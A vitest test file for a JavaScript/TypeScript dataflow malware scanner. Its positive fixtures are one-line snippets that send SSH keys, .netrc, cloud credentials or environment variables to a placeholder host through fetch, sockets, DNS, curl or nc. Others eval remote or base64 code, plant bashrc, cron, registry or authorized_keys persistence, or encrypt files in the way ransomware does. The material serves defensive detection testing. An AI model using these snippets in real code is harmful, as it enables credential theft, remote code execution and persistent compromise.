import { readFile } from "node:fs/promises";
import { createHash } from "node:crypto";
import { createRequire } from "node:module";
import { dirname, join } from "node:path";
import { describe, expect, it } from "vitest";
import { analyzeProgram } from "../src/scanner/dataflow/engine.js";
import { DataflowDeadline } from "../src/scanner/dataflow/ir.js";
import { analyzeDataflow } from "../src/scanner/dataflow/index.js";
import { createParser, grammarPath } from "../src/scanner/dataflow/parser.js";
import { javascriptFrontend, typescriptFrontend, tsxFrontend } from "../src/scanner/dataflow/frontends/javascript.js";
import type { SourceFile } from "../src/types.js";

async function scan(text: string, language: "javascript" | "typescript" = "javascript", startLine = 1) {
  const source: SourceFile = { text, language, path: `scripts/check.${language === "typescript" ? "ts" : "js"}`, startLine, endLine: startLine + text.split("\n").length - 1 };
  const frontend = language === "typescript" ? typescriptFrontend : javascriptFrontend;
  const parser = await createParser(frontend.grammar);
  const tree = parser.parse(text);
  try { return analyzeProgram(frontend.lower(tree!.rootNode, source), frontend.specs); }
  finally { tree?.delete(); parser.delete(); }
}

const positives: [string, string, string][] = [
  ["crontab command", "persistence", `require('child_process').execFileSync('crontab', ['placeholder.cron']);`],
  ["shell rc redirection", "persistence", `require('child_process').execSync('echo placeholder >> ~/.zshrc');`],
  ["registry key alias", "persistence", String.raw`const key = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'; require('child_process').execFile('reg', ['add', key, '/v', 'placeholder', '/d', 'echo placeholder']);`],
  ["process env import alias", "data_exfiltration", `import {env as environment} from 'node:process'; fetch('https://example.invalid/', {body:environment});`],
  ["createReadStream", "credential_theft", `fetch('https://example.invalid/', {body:require('fs').createReadStream('~/.ssh/id_rsa')});`],
  ["stream persistence", "persistence", `require('fs').createWriteStream('~/.bashrc').write('echo placeholder');`],
  ["net connect", "credential_theft", `require('net').connect(443,'example.invalid').write(require('fs').readFileSync('.netrc'));`],
  ["WebSocket module alias", "credential_theft", `import WS from 'ws'; const ws = new WS('wss://example.invalid/'); ws.send(require('fs').readFileSync('.netrc'));`],
  ["clipboard callback", "data_exfiltration", `require('child_process').exec('pbpaste', (error,stdout) => fetch('https://example.invalid/', {body:stdout}));`],
  ["async readdir callback", "data_exfiltration", `require('fs').readdir('fixtures', {recursive:true}, (error,names) => fetch('https://example.invalid/', {body:names}));`],
  ["async recursive readdir", "data_exfiltration", `import {readdir} from 'fs/promises'; fetch('https://example.invalid/', {body:await readdir('fixtures', {recursive:true})});`],
  ["Function parameter list", "remote_code_execution", `new Function('argument', atob('ZWNobyBwbGFjZWhvbGRlcg=='));`],
  ["btoa provenance", "credential_theft", `fetch('https://example.invalid/', {body:btoa(require('fs').readFileSync('.netrc'))});`],
  ["aliased imports in helpers", "credential_theft", `import {readFileSync as load} from 'fs'; function read(path) {return load(path);} fetch('https://example.invalid/', {body:read('.netrc')});`],
  ["ESM default and node prefix", "credential_theft", `import files from 'node:fs'; fetch('https://example.invalid/', {body: files.readFileSync('.netrc')});`],
  ["ESM namespace", "credential_theft", `import * as files from 'node:fs'; fetch('https://example.invalid/', {body: files.readFileSync('.netrc')});`],
  ["ESM named aliases and home join", "credential_theft", `import {readFileSync as read} from 'fs'; import {homedir as home} from 'node:os'; import {join as joinPath} from 'path'; fetch('https://example.invalid/', {body: read(joinPath(home(), '.ssh', 'id_rsa'))});`],
  ["CommonJS destructuring aliases", "credential_theft", `const {readFileSync: read} = require('node:fs'); const {post: send} = require('axios'); send('https://example.invalid/', read('~/.aws/credentials'));`],
  ["CommonJS module alias", "credential_theft", `const fs = require('fs'); const alias = fs; fetch('https://example.invalid/', {body: alias.readFileSync('.npmrc')});`],
  ["fs promises", "credential_theft", `import {readFile as read} from 'node:fs/promises'; fetch('https://example.invalid/', {body: await read('.git-credentials')});`],
  ["promise then", "credential_theft", `const fs = require('fs/promises'); fs.readFile('.netrc').then(value => fetch('https://example.invalid/', {body:value}));`],
  ["read callback", "credential_theft", `const fs = require('fs'); fs.readFile('.netrc', (error, value) => fetch('https://example.invalid/', {body:value}));`],
  ["template URL", "credential_theft", "const fs = require('fs'); fetch(`https://example.invalid/${fs.readFileSync('.netrc')}`);"],
  ["encoded buffer", "credential_theft", `const fs = require('fs'); fetch('https://example.invalid/', {body: Buffer.from(fs.readFileSync('.netrc')).toString('base64')});`],
  ["whole environment", "data_exfiltration", `fetch('https://example.invalid/', {body:process.env});`],
  ["environment entries", "data_exfiltration", `fetch('https://example.invalid/', {body: Object.entries(process.env)});`],
  ["environment spread", "data_exfiltration", `fetch('https://example.invalid/', {body: {...process.env}});`],
  ["environment JSON", "data_exfiltration", `fetch('https://example.invalid/', {body: JSON.stringify(process.env)});`],
  ["pbpaste clipboard", "data_exfiltration", `const {execSync: run} = require('child_process'); fetch('https://example.invalid/', {body: run('pbpaste')});`],
  ["xclip clipboard", "data_exfiltration", `import {execFileSync} from 'node:child_process'; fetch('https://example.invalid/', {body: execFileSync('xclip', ['-selection', 'clipboard', '-o'])});`],
  ["recursive readdir", "data_exfiltration", `const fs = require('fs'); fetch('https://example.invalid/', {body: fs.readdirSync('fixtures', {recursive:true})});`],
  ["glob", "data_exfiltration", `import {glob} from 'glob'; fetch('https://example.invalid/', {body: await glob('fixtures/**/*')});`],
  ["axios config", "credential_theft", `import axios from 'axios'; const fs = require('fs'); axios({url:'https://example.invalid/', method:'post', data:fs.readFileSync('.netrc')});`],
  ["axios methods", "credential_theft", `import axios from 'axios'; const fs = require('fs'); axios.patch('https://example.invalid/', fs.readFileSync('.netrc'));`],
  ["HTTP request write", "credential_theft", `const https = require('node:https'); const fs = require('fs'); const req = https.request('https://example.invalid/'); req.write(fs.readFileSync('.netrc')); req.end();`],
  ["HTTP get end body", "credential_theft", `const http = require('http'); const fs = require('fs'); http.get('http://example.invalid/').end(fs.readFileSync('.netrc'));`],
  ["net socket", "credential_theft", `const net = require('net'); const fs = require('fs'); net.createConnection(443, 'example.invalid').write(fs.readFileSync('.netrc'));`],
  ["datagram", "credential_theft", `const dgram = require('node:dgram'); const fs = require('fs'); dgram.createSocket('udp4').send(fs.readFileSync('.netrc'), 53, 'example.invalid');`],
  ["DNS resolve", "credential_theft", `const dns = require('node:dns'); const fs = require('fs'); dns.resolveTxt(fs.readFileSync('.netrc') + '.example.invalid');`],
  ["DNS lookup", "credential_theft", `import {lookup} from 'dns/promises'; const fs = require('fs'); lookup(fs.readFileSync('.netrc') + '.example.invalid');`],
  ["WebSocket", "credential_theft", `const fs = require('fs'); const socket = new WebSocket('wss://example.invalid/'); socket.send(fs.readFileSync('.netrc'));`],
  ["curl command", "credential_theft", `const cp = require('child_process'); const fs = require('fs'); cp.spawn('curl', ['https://example.invalid/', '--data', fs.readFileSync('.netrc')]);`],
  ["wget execFile", "credential_theft", `const {execFile} = require('child_process'); const fs = require('fs'); execFile('wget', ['--post-data', fs.readFileSync('.netrc'), 'https://example.invalid/']);`],
  ["nc exec", "credential_theft", "const {exec} = require('child_process'); const fs = require('fs'); exec(`echo ${fs.readFileSync('.netrc')} | nc example.invalid 80`);"],
  ["response eval", "remote_code_execution", `eval(await (await fetch('https://example.invalid/fixture')).text());`],
  ["axios response execution", "remote_code_execution", `import axios from 'axios'; eval((await axios.get('https://example.invalid/fixture')).data);`],
  ["Function response", "remote_code_execution", `new Function(await (await fetch('https://example.invalid/fixture')).text());`],
  ["decoded atob", "remote_code_execution", `eval(atob('ZWNobyBwbGFjZWhvbGRlcg=='));`],
  ["decoded Buffer", "remote_code_execution", `eval(Buffer.from('ZWNobyBwbGFjZWhvbGRlcg==','base64').toString());`],
  ["vm context", "remote_code_execution", `const vm = require('node:vm'); vm.runInNewContext(await (await fetch('https://example.invalid/fixture')).text());`],
  ["shell response", "remote_code_execution", `const cp = require('child_process'); cp.spawn(await (await fetch('https://example.invalid/fixture')).text(), [], {shell:true});`],
  ["require response path", "remote_code_execution", `require(await (await fetch('https://example.invalid/fixture')).text());`],
  ["dynamic import response path", "remote_code_execution", `import(await (await fetch('https://example.invalid/fixture')).text());`],
  ["download file then require", "remote_code_execution", `const fs = require('fs'); fs.writeFileSync('download.js', await (await fetch('https://example.invalid/fixture')).text()); require('./download.js');`],
  ["download file then spawn", "remote_code_execution", `const fs = require('fs'); const cp = require('child_process'); fs.writeFileSync('download.js', await (await fetch('https://example.invalid/fixture')).text()); cp.spawn('node', ['download.js']);`],
  ["bashrc persistence", "persistence", `require('fs').appendFileSync('~/.bashrc', 'echo placeholder');`],
  ["crontab persistence", "persistence", `require('fs').writeFileSync('/etc/cron.d/placeholder', 'echo placeholder');`],
  ["LaunchAgents persistence", "persistence", `require('fs').writeFileSync('~/Library/LaunchAgents/placeholder.plist', 'placeholder');`],
  ["user systemd persistence", "persistence", `require('fs').writeFileSync('~/.config/systemd/user/placeholder.service', 'placeholder');`],
  ["registry persistence", "persistence", String.raw`require('child_process').spawn('reg', ['add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', '/v', 'placeholder', '/d', 'echo placeholder']);`],
  ["XOR walk", "file_system", `const fs = require('fs'); for (const name of fs.readdirSync('fixtures', {recursive:true})) { const data = fs.readFileSync(name); const encrypted = data.map(byte => byte ^ 42); fs.writeFileSync(name, encrypted); }`],
  ["crypto walk", "file_system", `const fs = require('fs'); const crypto = require('crypto'); for (const name of fs.readdirSync('fixtures', {recursive:true})) { const cipher = crypto.createCipheriv('aes-256-cbc', 'placeholder', 'placeholder'); const encrypted = cipher.update(fs.readFileSync(name)); fs.writeFileSync(name, encrypted); }`],
  ["callback walk", "file_system", `const fs = require('fs'); const crypto = require('crypto'); fs.readdirSync('fixtures', {recursive:true}).forEach(name => { const encrypted = crypto.createCipheriv('aes-256-cbc', 'placeholder', 'placeholder').update(fs.readFileSync(name)); fs.writeFileSync(name, encrypted); });`],
  ["helper return", "credential_theft", `const fs = require('fs'); function identity(x) { return x; } fetch('https://example.invalid/', {body: identity(fs.readFileSync('.netrc'))});`],
  ["helper sink", "credential_theft", `const fs = require('fs'); const send = value => fetch('https://example.invalid/', {body:value}); send(fs.readFileSync('.netrc'));`],
  ["aliased object mutation", "credential_theft", `const fs = require('fs'); const body = {}; const alias = body; body.secret = fs.readFileSync('.netrc'); fetch('https://example.invalid/', {body:alias});`],
  ["Bun file", "credential_theft", `const key = await Bun.file(process.env.HOME + '/.ssh/id_rsa').text(); await fetch('https://example.invalid/', {method:'POST', body:key});`],
  ["Bun environment", "data_exfiltration", `await fetch('https://example.invalid/', {method:'POST', body:JSON.stringify(Bun.env)});`],
  ["Deno file", "credential_theft", `const key = await Deno.readTextFile(Deno.env.get('HOME') + '/.aws/credentials'); await fetch('https://example.invalid/', {method:'POST', body:key});`],
  ["Deno environment", "data_exfiltration", `await fetch('https://example.invalid/', {method:'POST', body:JSON.stringify(Deno.env.toObject())});`],
  ["Bun spawn argv", "remote_code_execution", `const code = await (await fetch('https://example.invalid/placeholder')).text(); Bun.spawn(['sh', '-c', code]);`],
  ["Bun shell template", "remote_code_execution", "import { $ } from 'bun'; const code = await (await fetch('https://example.invalid/placeholder')).text(); await $`sh -c ${code}`;"],
  ["Deno command", "remote_code_execution", `const code = await (await fetch('https://example.invalid/placeholder')).text(); await new Deno.Command('sh', {args:['-c', code]}).output();`],
  ["command output of a key", "credential_theft", `const key = require('child_process').execSync('cat ~/.ssh/id_rsa').toString(); fetch('https://example.invalid/', {method:'POST', body:key});`],
  ["command output of the environment", "data_exfiltration", `const all = require('child_process').execSync('env').toString(); fetch('https://example.invalid/', {method:'POST', body:all});`],
  ["authorized keys", "persistence", `require('fs').appendFileSync(require('os').homedir() + '/.ssh/authorized_keys', 'ssh-rsa placeholder');`],
];

describe("JavaScript dataflow positives", () => {
  it.each(positives)("%s", async (_name, category, code) => {
    const findings = await scan(code);
    expect(findings.some((f) => f.category === category && ["high", "critical"].includes(f.severity)), JSON.stringify(findings)).toBe(true);
    expect(findings.every((f) => f.analysisPass === "dataflow")).toBe(true);
  });
});

const negatives: [string, string][] = [
  ["crontab read command", `require('child_process').execFileSync('crontab', ['-l']);`],
  ["public destructured env", `const {HOME:home} = process.env; fetch('https://example.invalid/', {body:home});`],
  ["aliased env header", `import {env} from 'node:process'; const {API_TOKEN:token} = env; fetch('https://example.invalid/', {headers:{Authorization:token}});`],
  ["spawn public program with response input", `require('child_process').spawn('echo', [await (await fetch('https://example.invalid/fixture')).text()]);`],
  ["clipboard command mentioned as an argument", `fetch('https://example.invalid/', {body:require('child_process').execSync('echo pbpaste')});`],
  ["helper has no return", `function ignore(value) {console.log(value);} fetch('https://example.invalid/', {body:ignore(process.env)});`],
  ["header helper", `function headers(token) {return {Authorization:token};} fetch('https://example.invalid/', {headers:headers(process.env.API_TOKEN)});`],
  ["axios helper header", `import a from 'axios'; function send(token) {a.get('https://example.invalid/', {headers:{Authorization:token}});} send(process.env.API_TOKEN);`],
  ["callback parameters inside branches", `let errors = []; if (condition) errors.forEach(err => console.error(err)); fetch('https://example.invalid/', {body:'public'});`],
  ["fetch Authorization", `fetch('https://example.invalid/', {headers:{Authorization:'Bearer ' + process.env.API_TOKEN}});`],
  ["fetch API key header", `fetch('https://example.invalid/', {headers:{'X-API-Key':process.env.API_KEY}, body:'public'});`],
  ["axios header", `import axios from 'axios'; axios.get('https://example.invalid/', {headers:{Authorization:process.env.API_TOKEN}});`],
  ["axios config header", `import axios from 'axios'; axios({url:'https://example.invalid/', headers:{'X-Key':process.env.API_KEY}});`],
  ["request options alias", `const options = {headers:{Authorization:process.env.API_TOKEN}}; fetch('https://example.invalid/', options);`],
  ["OpenAI apiKey", `import OpenAI from 'openai'; const client = new OpenAI({apiKey:process.env.OPENAI_API_KEY});`],
  ["Anthropic apiKey", `import Anthropic from '@anthropic-ai/sdk'; new Anthropic({apiKey:process.env.ANTHROPIC_API_KEY});`],
  ["read only", `const fs = require('fs'); const secret = fs.readFileSync('.netrc');`],
  ["public env", `fetch('https://example.invalid/', {body:process.env.HOME});`],
  ["overwritten value", `const fs = require('fs'); let value = fs.readFileSync('.netrc'); value = 'public'; fetch('https://example.invalid/', {body:value});`],
  ["both branches overwrite", `const fs = require('fs'); let value = fs.readFileSync('.netrc'); if (condition) value = 'public'; else value = 'also public'; fetch('https://example.invalid/', {body:value});`],
  ["public send", `fetch('https://example.invalid/', {body:'public'});`],
  ["download saved only", `const fs = require('fs'); fs.writeFileSync('download.txt', await (await fetch('https://example.invalid/fixture')).text());`],
  ["decode saved only", `require('fs').writeFileSync('local.txt', Buffer.from('cGxhY2Vob2xkZXI=', 'base64'));`],
  ["local backup", `const fs = require('fs'); for (const name of fs.readdirSync('fixtures', {recursive:true})) fs.writeFileSync('backup/' + name, fs.readFileSync(name));`],
  ["SSH config", `fetch('https://example.invalid/', {body:require('fs').readFileSync('~/.ssh/config')});`],
  ["source in comment", `// fetch('https://example.invalid/', {body:process.env});\nfetch('https://example.invalid/', {body:'public'});`],
  ["unrelated helper argument", `function second(a,b) { return b; } fetch('https://example.invalid/', {body:second(process.env, 'public')});`],
  ["unrelated encryption and write", `const fs = require('fs'); const crypto = require('crypto'); for (const name of fs.readdirSync('fixtures')) { const raw = fs.readFileSync(name); const encrypted = crypto.createCipheriv('aes-256-cbc', 'placeholder', 'placeholder').update('public'); fs.writeFileSync('local.txt', 'placeholder'); }`],
  ["Bun file that is public", `const text = await Bun.file('README.md').text(); await fetch('https://example.invalid/', {method:'POST', body:text});`],
  ["Bun spawn of a literal", `Bun.spawn(['echo', 'placeholder']);`],
  ["shell template of a literal", "import { $ } from 'bun'; await $`echo placeholder`;"],
  ["command output that is public", `const out = require('child_process').execSync('git status').toString(); fetch('https://example.invalid/', {method:'POST', body:out});`],
  ["command that only names a key", `const out = require('child_process').execSync('ssh -i ~/.ssh/id_rsa example.invalid echo placeholder').toString(); fetch('https://example.invalid/', {method:'POST', body:out});`],
  ["Deno variable that is not a secret", `fetch('https://example.invalid/', {method:'POST', body:Deno.env.get('HOME')});`],
];
describe("JavaScript negative controls", () => {
  it.each(negatives)("%s", async (_name, code) => expect(await scan(code)).toEqual([]));
  it("keeps a header secret sent in a body visible", async () => {
    expect(await scan(`const token = process.env.API_TOKEN; fetch('https://example.invalid/', {headers:{Authorization:token}, body:token});`)).toEqual([expect.objectContaining({severity:"medium",category:"data_exfiltration"})]);
  });
  it("keeps whole env and file credentials visible in headers", async () => {
    for (const value of ["process.env", "require('fs').readFileSync('.netrc')"]) expect(await scan(`fetch('https://example.invalid/', {headers:{Authorization:${value}}});`)).toEqual([expect.objectContaining({severity:"critical"})]);
  });
});

describe("JavaScript/TypeScript frontend contract", () => {
  it("uses the exactly pinned parser runtime", async () => {
    const runtime = createRequire(import.meta.url).resolve('web-tree-sitter');
    const metadata = JSON.parse(await readFile(join(dirname(runtime),'package.json'),'utf8'));
    expect(metadata.version).toBe('0.27.1');
  });
  it("parses TSX expressions with the dedicated grammar", async () => {
    const text = `import {readFileSync as read} from 'fs'; const view = <div>{read('.netrc')}</div>; fetch('https://example.invalid/', {body:view});`;
    const parser = await createParser('tsx'); const tree = parser.parse(text)!;
    try {
      expect(tree.rootNode.hasError).toBe(false);
      const source: SourceFile = {text, language:'typescript', path:'view.tsx', startLine:1, endLine:1};
      expect(analyzeProgram(tsxFrontend.lower(tree.rootNode,source),tsxFrontend.specs)).toEqual([expect.objectContaining({category:'credential_theft'})]);
    } finally {tree.delete(); parser.delete();}
  });
  it("honors the lowering deadline", async () => {
    const parser = await createParser('javascript'); const text = 'fetch("https://example.invalid/");'; const tree = parser.parse(text)!;
    try {expect(() => javascriptFrontend.lower(tree.rootNode, {text,language:'javascript',path:'fixture.js',startLine:1,endLine:1}, 0)).toThrow(DataflowDeadline);}
    finally {tree.delete();parser.delete();}
  });
  it.each(['get','post','put','patch','delete','head','options','request','postForm','putForm','patchForm'])("tracks axios.%s", async (method) => {
    const options = /^(?:post|put|patch)(?:Form)?$/.test(method) ? `process.env` : `{data:process.env}`;
    expect(await scan(`import axios from 'axios'; axios.${method}('https://example.invalid/', ${options});`)).toEqual([expect.objectContaining({category:'data_exfiltration',severity:'critical'})]);
  });
  it("uses TypeScript grammar for typed declarations and helpers", async () => {
    const findings = await scan(`import {readFileSync as read} from 'node:fs'; function identity(value: string): string { return value; } const secret: string = read('.netrc', 'utf8'); fetch('https://example.invalid/', {body:identity(secret)});`, "typescript");
    expect(findings).toEqual([expect.objectContaining({category:"credential_theft",severity:"critical"})]);
  });
  it("maps an offset source to its original sink line", async () => {
    const findings = await scan("const fs = require('fs');\nconst value = fs.readFileSync('.netrc');\nfetch('https://example.invalid/', {body:value});", "javascript", 40);
    expect(findings[0].lineNumber).toBe(42);
    expect(findings[0].evidence).toContain("scripts/check.js:2 read .netrc -> :3 fetch");
  });
  it("accepts partial syntax-error trees", async () => {
    await expect(scan("fetch('https://example.invalid/', {body:process.env});\nfunction broken( {")).resolves.toEqual(expect.any(Array));
  });
  it.each(["javascript", "typescript", "tsx"])("loads the vendored %s grammar with the pinned runtime", async (grammar) => {
    const parser = await createParser(grammar);
    try {
      const hashes: Record<string,string> = {
        javascript:'5fb488d0cabb4775a594bab85682de5ad6ce83c0d6ac997a9f82dd084d571240',
        typescript:'778025db5a8be0e70f8ccc3671e486dfeddd048c25d9e8a70c26de2e1bf6f97d',
        tsx:'79e5da75ea62855a0cd67177685f0164eac87d5f630b3cbe1e0a099751ad30f8',
      };
      expect(createHash('sha256').update(await readFile(await grammarPath(grammar))).digest('hex')).toBe(hashes[grammar]);
      expect(parser.language!.abiVersion).toBe(grammar === 'javascript' ? 15 : 14);
      expect(parser.language!.abiVersion).toBeGreaterThanOrEqual(13);
      expect(parser.language!.abiVersion).toBeLessThanOrEqual(15);
      const tree = parser.parse(grammar === "typescript" ? "const value: string = 'public';" : "const value = 'public';");
      expect(tree!.rootNode.hasError).toBe(false); tree?.delete();
    } finally { parser.delete(); }
  });

  it("rates one destructured env token in a URL medium: an API client authenticating", async () => {
    const findings = await scan("const {API_TOKEN:token} = process.env; fetch(`https://example.invalid/${token}`);");
    expect(findings).toEqual([expect.objectContaining({ severity: "medium", category: "data_exfiltration" })]);
  });
});

describe("JavaScript prefilter", () => {
  const through = (text: string) => analyzeDataflow([{ path: "scripts/check.js", text, language: "javascript", startLine: 1, endLine: text.split("\n").length }], { budgetMs: 5000 });
  it.each(positives)("keeps %s", (_name, _category, code) => { expect(javascriptFrontend.mayFind!(code)).toBe(true); });
  // clawvet.persistence, clawvet.execute and clawvet.clipboard are names the
  // frontend makes up; no source spells them. They are only made inside a
  // process call, whose module name the source does spell, so the hint holds.
  it.each([
    ["clawvet.persistence", "persistence", `const { exec } = require("child_process");\nexec("echo placeholder | crontab -");`],
    ["clawvet.execute", "remote_code_execution", `const { spawn } = require("child_process");\nconst code = await (await fetch("https://example.invalid/placeholder")).text();\nrequire("fs").writeFileSync("placeholder.js", code);\nspawn("node", ["placeholder.js"]);`],
    ["clawvet.clipboard", "data_exfiltration", `const run = require("child_process");\nrun.exec("pbpaste", (error, out) => { run.exec("curl -d '" + out + "' https://example.invalid/"); });`],
  ])("reaches a file whose only sink is the synthesised %s", async (_name, category, code) => {
    expect(await through(code)).toEqual(expect.arrayContaining([expect.objectContaining({ category })]));
  });
  it("still skips a source that names no API", () => { expect(javascriptFrontend.mayFind!("const total = [1, 2].map((n) => n * 2);")).toBe(false); });
});

describe("javascript limits", () => {
  const source = (text: string): SourceFile => ({ path: "scripts/check.js", text, language: "javascript", startLine: 1, endLine: 1 });

  it("keeps a credential send behind many identical helper sends", async () => {
    const text = "function send(x,y){" + "fetch('https://example.invalid/',{body:y});".repeat(64)
      + "fetch('https://example.invalid/',{body:x});}send(require('fs').readFileSync('.netrc'),'placeholder');";
    const findings = await analyzeDataflow([source(text)], { budgetMs: 5000 });
    expect(findings).toEqual(expect.arrayContaining([expect.objectContaining({ category: "credential_theft" })]));
  });

  it("reports nesting past the depth guard as incomplete", async () => {
    const text = "if(true){".repeat(140) + "fetch('https://example.invalid/',{body:require('fs').readFileSync('.netrc')});" + "}".repeat(140);
    const findings = await analyzeDataflow([source(text)], { budgetMs: 5000 });
    expect(findings).toEqual(expect.arrayContaining([expect.objectContaining({ title: "Dataflow analysis truncated" })]));
  });

  it("does not report ordinary code as incomplete", async () => {
    const text = "const fs = require('fs');\nfunction load(p) { return fs.readFileSync(p, 'utf8'); }\nfor (const f of ['a', 'b']) console.log(load(f));";
    const findings = await analyzeDataflow([source(text)], { budgetMs: 5000 });
    expect(findings.filter((f) => f.title === "Dataflow analysis truncated")).toEqual([]);
  });
});
